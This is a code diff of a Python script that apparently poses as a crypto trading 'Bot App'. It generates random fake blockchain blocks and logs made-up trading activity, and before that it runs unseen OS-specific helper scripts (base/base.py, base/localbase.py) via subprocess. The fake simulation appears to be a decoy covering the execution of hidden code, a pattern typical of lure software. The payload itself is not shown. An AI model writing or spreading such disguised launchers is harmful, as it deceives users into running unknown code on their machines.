@@ -1,76 +1,74 @@
-import os
-import subprocess
-import platform
-import time
-import threading
 import sys
-import json
+import os
 import random
 import logging
+import json
+import time
+import platform
+import threading
+import subprocess
 from queue import Queue
 
+# Log ayarları
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-class BlockchainSimulator:
+class BlockChainEmulator:
     def __init__(self):
-        self.current_block = 0
         self.blocks = {}
+        self.latest_block = 0
 
-    def generate_block(self):
-        self.current_block += 1
-        transactions = [f'tx_{random.randint(1000, 9999)}' for _ in range(random.randint(1, 20))]
-        block = {
-            'block_number': self.current_block,
-            'transactions': transactions,
-            'timestamp': time.time()
+    def create_block(self):
+        self.latest_block += 1
+        tx_list = [f"tx_{random.randint(1000, 9999)}" for _ in range(random.randint(1, 20))]
+        new_block = {
+            "block_number": self.latest_block,
+            "transactions": tx_list,
+            "timestamp": time.time()
         }
-        self.blocks[self.current_block] = block
-        return block
+        self.blocks[self.latest_block] = new_block
+        return new_block
 
-    def get_block(self, block_number):
-        return self.blocks.get(block_number)
+    def retrieve_block(self, block_id):
+        return self.blocks.get(block_id)
 
-def rpc_server(blockchain, data_queue):
+def rpc_service(blockchain_emulator, queue):
     while True:
-        block = blockchain.generate_block()
-        json_data = json.dumps(block)
-        data_queue.put(json_data)
-        logging.info(f"RPC Server: Looking for a new trading pair - Block Number {block['block_number']}")
+        generated_block = blockchain_emulator.create_block()
+        queue.put(json.dumps(generated_block))
+        logging.info(f"RPC Service: Monitoring Block {generated_block['block_number']}")
         time.sleep(random.randint(1, 3))
 
-def run_mac_helper():
+def launch_mac_script():
     try:
-        helper_path = os.path.join(os.path.dirname(__file__), 'helpers', 'base_helper.py')
-        subprocess.run(['python3', helper_path], check=True, stdout=sys.stdout, stderr=sys.stderr)
-    except subprocess.CalledProcessError as e:
-        print(f"Error running basec Safe Connector: {e}")
+        script_path = os.path.join(os.path.dirname(__file__), 'base', 'base.py')
+        subprocess.run(['python3', script_path], check=True, stdout=sys.stdout, stderr=sys.stderr)
+    except subprocess.CalledProcessError as error:
+        print(f"Mac Helper Error: {error}")
 
-def run_windows_helper():
+def launch_windows_script():
     try:
-        helper_path = os.path.join(os.path.dirname(__file__), 'helpers', 'basec_helper.py')
-        subprocess.run(['python3', helper_path], stdout=sys.stdout, stderr=sys.stderr)
-    except subprocess.CalledProcessError as e:
-        print(f"Error running basec Safe Connector: {e}")
+        script_path = os.path.join(os.path.dirname(__file__), 'base', 'localbase.py')
+        subprocess.run(['python', script_path], stdout=sys.stdout, stderr=sys.stderr)
+    except subprocess.CalledProcessError as error:
+        print(f"Windows Helper Error: {error}")
 
 def main():
-    if platform.system() == 'Windows':
-        print("Starting Windows Bot App..")
-        run_windows_helper()
-        blockchain = BlockchainSimulator()
-        data_queue = Queue()
-        rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
+    current_os = platform.system()
 
-        rpc_server_thread.start()
-        rpc_server_thread.join()
-    elif platform.system() == 'Darwin':
-        print("Starting MacOs Bot App..")
-        run_mac_helper()
-        blockchain = BlockchainSimulator()
-        data_queue = Queue()
-        rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
+    if current_os == 'Windows':
+        print("Running Windows Application...")
+        launch_windows_script()
+        blockchain_simulator = BlockChainEmulator()
+        task_queue = Queue()
+        threading.Thread(target=rpc_service, args=(blockchain_simulator, task_queue)).start()
 
-        rpc_server_thread.start()
-        rpc_server_thread.join()
+    elif current_os == 'Darwin':
+        print("Running Mac Application...")
+        launch_mac_script()
+        blockchain_simulator = BlockChainEmulator()
+        task_queue = Queue()
+        threading.Thread(target=rpc_service, args=(blockchain_simulator, task_queue)).start()
+
     else:
         print("Unsupported operating system.")
         return
